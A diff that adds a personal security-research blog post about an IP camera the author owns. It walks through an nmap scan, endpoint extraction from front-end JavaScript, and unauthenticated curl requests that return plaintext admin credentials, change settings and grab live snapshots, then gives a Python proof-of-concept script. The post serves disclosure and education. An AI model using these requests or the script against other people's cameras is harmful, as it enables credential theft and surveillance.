@@ -1,0 +1,329 @@
+---
+title: "Breaking Into My Own IP Camera"
+publishedAt: "2026-03-31"
+public: false
+language: "en"
+translationKey: "breaking-into-my-own-ip-camera"
+tags: IoT Security, Vulnerability Research, Network Security, Reverse Engineering, API Security
+summary: "Analyzing a cheap IP camera led to unauthenticated access to sensitive endpoints, credential disclosure, and full device compromise."
+image: "/blog-posts/home-camera-research/web-panel-log-site.png"
+---
+
+### Introduction
+I didn't buy this camera to break into it.
+
+We got it a while ago, set it up, used it like any normal cheap IP camera. Back then I didn't really have the skills to look into how it actually worked. It was just "plug it in, open the app, streams video".
+
+Today, I got bored and remembered it. Same camera, same network, just a bit more knowledge. So I figured I'd take a look at it properly.
+
+### First Look
+I started with a simple scan:
+```
+nmap -sV -p- 192.168.0.115
+```
+
+What came back was already interesting. It wasn't just a web interface:
+- Telnet open (BusyBox)
+- HTTP / HTTPS
+- RTSP on 8554
+- A bunch of weird high ports
+- Snapshot endpoints on 6688
+
+```
+└─$ nmap -sV -p- 192.168.0.115
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 21:02 +0200
+Nmap scan report for 192.168.0.115
+Host is up (0.018s latency).
+Not shown: 65524 closed tcp ports (reset)
+PORT      STATE SERVICE         VERSION
+23/tcp    open  telnet          BusyBox telnetd
+80/tcp    open  http
+443/tcp   open  ssl/https
+843/tcp   open  unknown
+1234/tcp  open  hotline?
+1300/tcp  open  h323hostcallsc?
+6688/tcp  open  tcpwrapped
+8554/tcp  open  rtsp
+8699/tcp  open  arcserve        ARCserve Discovery
+9876/tcp  open  sd?
+16668/tcp open  unknown
+```
+
+That's already more surface than a "simple camera" should realistically expose.
+
+### The Web Interface
+Opening the web panel didn't give much at first. Basic login page, nothing special.
+
+![Landing Page](/blog-posts/home-camera-research/web-panel-landing-page.png)
+
+But when I pulled the front-end files (`/doc/page` and `/doc/script`), things started to make more sense.
+
+The login logic lives in JavaScript, and it literally sends credentials like this:
+`GET /PSIA/YG/userCheck?userName=<user>&password=<pass>`
+No hashing, no challenge, nothing. Just plain credentials over HTTPS.
+
+That alone is bad, but it gets worse.
+
+### Weird Stuff in Frontend
+While reading the login script, I noticed a hard-coded check:
+- If the username is `super_yg`, it skips part of the normal login flow and jumps straight into the UI logic.
+That doesn't automatically mean admin access, but it tells you one thing:
+- There are shortcuts baked into the frontend that shouldn't exist.
+At this point it was obvious the backend probably isn't doing much validation either.
+
+### API Exploration
+The camera exposes a bunch of endpoints under `/PSIA/`.
+
+So normally, I started poking at them directly with `curl`, without logging in.
+
+For example:
+```bash
+curl http://192.168.0.115/PSIA/YG/system/time
+```
+
+The Output:
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<Time version="1.0" xmlns="urn:psialliance-org">
+	<timeMode>NTP</timeMode>
+	<localTime>2026-03-31T05:25:34</localTime>
+	<timeZone>CST-08:00:00</timeZone>
+</Time>
+```
+
+It returned valid data. No authentication though. :(
+
+At that point I didn't immediately jump to sensitive stuff. I started just poking around to see how much of the API was exposed.
+
+Tried a few more endpoints:
+- `/PSIA/System/deviceInfo`
+- `/PSIA/System/Network/interfaces`
+- `/PSIA/YG/netWork/wireless`
+- `/PSIA/YG/netWork/getAllPort`
+- `/PSIA/YG/system/time`
+All of them responded with actual data. Still though, no authentication. :(
+
+That's when it became clear that this wasn't just a misconfigured endpoint, the API itself was straight up not enforcing authentication properly.
+
+So I kept going and tried something more sensitive. That’s when things got interesting.
+
+### How I found the Interesting Endpoints
+If I could've guessed these endpoints, I would've. I pulled all the javascript files and extracted every `/PSIA/` route I could find.
+
+```bash
+grep -h -oE '/PSIA/[A-Za-z0-9_./]+' \  
+/tmp/cam_paramconfig.js /tmp/cam_params_system.js /tmp/cam_params_network.js \  
+/tmp/cam_params_user.js /tmp/cam_params_videosettings.js /tmp/cam_params_storage.js \  
+/tmp/cam_params_localconfig.js /tmp/cam_params_event.js | sort -u
+```
+
+And oh my god did I get the full list of API endpoints the camera uses:
+
+```bash
+/PSIA/Security/AAA/users
+/PSIA/Security/AAA/users/
+/PSIA/System/deviceInfo
+/PSIA/System/factoryReset
+/PSIA/System/Network/interfaces
+/PSIA/System/Network/interfaces/
+/PSIA/System/Network/interfaces/2/WPS
+/PSIA/System/Network/interfacesByuserIP
+/PSIA/System/Network/PPPoE
+/PSIA/System/reboot
+/PSIA/System/Video/inputs
+/PSIA/YG/authentication/onvif
+/PSIA/YG/authentication/rtsp
+/PSIA/YG/event/motionDetection
+/PSIA/YG/netWork/DDNS
+/PSIA/YG/netWork/DDNS/capabilities
+/PSIA/YG/netWork/email
+/PSIA/YG/netWork/ftpc
+/PSIA/YG/netWork/getAllPort
+/PSIA/YG/netWork/UPNP
+/PSIA/YG/netWork/UPNP/ports
+/PSIA/YG/netWork/UPNP/ports/status
+/PSIA/YG/netWork/wireless
+/PSIA/YG/netWork/wireless/accessPointList
+/PSIA/YG/netWork/wps
+/PSIA/YG/OSD/OSDConfig
+/PSIA/YG/storage/SDCard
+/PSIA/YG/storage/storageManager
+/PSIA/YG/system/ntpServers
+/PSIA/YG/system/time
+/PSIA/YG/system/upgradeFactoryReset
+/PSIA/YG/system/upgradeRes
+/PSIA/YG/system/upgradeStatus
+/PSIA/YG/system/upgradeUboot
+/PSIA/YG/userCheck
+```
+
+Most were expected, but one stood out immediately:
+`/PSIA/Security/AAA/users/`
+
+Anything with `AAA (Authentication, Authorization, Accounting)` is usually sensitive. This being the most important find so far, I of course tried it.
+
+### The "Oh sh*t" moment
+```bash
+curl http://192.168.0.115/PSIA/Security/AAA/users
+```
+
+What I got was IN PLAIN TEXT. No authentication. Nothing. And the response? It straight up returned credentials.
+
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<UserList version="1.0" xmlns="urn:psialliance-org">
+	<max_user>10</max_user>
+	<User version="1.0" xmlns="urn:psialliance-org">
+		<id>1</id>
+		<userName>admin</userName>
+		<password>admin123456</password>
+		<userType>admin</userType>
+	</User>
+</UserList>
+```
+
+Plaintext. At this point it went from "the API is loose" to "oh god they don't care about it".
+
+### Verifying the Credentials
+Just to make sure I wasn't trolled, I went on the site and logged in.
+
+##### Live View Page
+![Live View Page](/blog-posts/home-camera-research/web-panel-logged-in.png)
+
+##### Logs Page
+![Logs Page](/blog-posts/home-camera-research/web-panel-log-site.png)
+
+##### Configuration Page
+![Configuration Page](/blog-posts/home-camera-research/web-panel-configuration-page.png)
+
+I can change every single possible camera setting without any issues.
+
+So yeah, valid admin credentials, dumped without authentication.
+
+### It Gets Worse
+At this point I had:
+- Admin credentials
+- Full read access
+
+It started as "how far can I go?" and quickly turned into "how much more does this thing let me do?"
+
+So I tested a harmless write:
+```bash
+curl -X PUT http://192.168.0.115/PSIA/YG/system/time \  
+-H "Content-Type: application/xml" \  
+--data '<Time><timeMode>manual</timeMode><localTime>2026-03-30T22:42:30</localTime></Time>'
+```
+
+Response:
+```bash
+200 OK
+```
+
+No authentication. 
+
+Not only:
+- There's no authentication for reading sensitive data
+- There's no authentication for modifying system state
+
+Game over.
+
+### Camera Feed
+Remember port `6688` from the scan?
+
+```bash
+curl http://192.168.0.115:6688/snapshot.jpg
+```
+
+That returns a live snapshot from the camera. No authentication... of course.
+
+### Now what?
+Without logging in properly, I was able to:
+- Dump admin credentials
+- Read network configuration (including Wi-Fi)
+- Access live camera snapshots
+- Modify system settings
+- Interact with camera control endpoints
+
+All from a completely unauthenticated position.
+
+### Proof of Concept (Mostly automation)
+At this point, everything I did was done manually, but honestly, where would we be if we didn't over-engineer everything we do? If you can do it once with `curl`, why not automate it with a few lines of Python?
+
+What the PoC does:
+- Dumps users (including credentials)
+- Fetches device information
+- Grabs a live snapshot (not included in the report for obvious reasons)
+
+```python
+import requests
+
+TARGET = "http://192.168.0.115"
+
+endpoints = {
+	"users": "/PSIA/Security/AAA/users",
+	"device_info": "/PSIA/System/deviceInfo",
+	"snapshot": ":6688/snapshot.jpg"
+}
+
+def fetch(path):
+	try:
+		r = requests.get(TARGET + path, timeout=5)
+		return r.text if r.status_code == 200 else f"[!] Failed ({r.status_code})"
+	except Exception as e:
+		return f"[!] Error: {e}"
+
+  
+print("[+] Dumping users...")
+print(fetch(endpoints["users"]))
+
+print("\n[+] Fetching device info...")
+print(fetch(endpoints["device_info"]))
+
+print("\n[+] Saving snapshot...")
+try:
+	r = requests.get(TARGET + endpoints["snapshot"], timeout=5)
+
+	if r.status_code == 200:
+		with open("snapshot.jpg", "wb") as f:
+			f.write(r.content)
+		print("[+] Snapshot saved as snapshot.jpg")
+	else:
+		print(f"[!] Snapshot failed ({r.status_code})")
+except Exception as e:
+	print(f"[!] Error: {e}")
+```
+
+### Final Thoughts & Real World Impact
+What I did wasn't some advanced exploit. There was no memory corruption or any fancy bypass.
+
+Just:
+- Read the frontend
+- Extract endpoints
+- Call them directly
+
+And everything falls apart. It's easy to look at this and say "yeah but it's just a cheap camera why overthink this". Put it in a real scenario:
+- Someone exposes this device to the internet (port forwarding, bad UPnP, whatever)
+- Or someone is already inside the network
+
+At that point:
+- Your camera feed is public
+- Your Wi-Fi credentials are exposed
+- Your device can be modified or reset
+- And you wouldn't even know
+
+I'm fully aware this is older firmware, but that's kind of the problem. Devices like these stay in homes, and small offices without ever getting updated.
+
+### Vulnerability Summary  
+Unauthenticated access to sensitive API endpoints allows attackers to:  
+- Retrieve credentials  
+- Access live camera feeds  
+- Modify system configuration
+
+### Vulnerability Classification
+The issues observed map to multiple common weakness classes:
+- **CWE-306** – Missing Authentication for Critical Function
+- **CWE-522** – Insufficiently Protected Credentials
+- **CWE-284** – Improper Access Control
+- **CWE-319** – Cleartext Transmission of Sensitive Information
+
+I'm fully aware this is older firmware, but that's kind of the problem. Devices like these stay in homes, and small offices without ever getting updated.
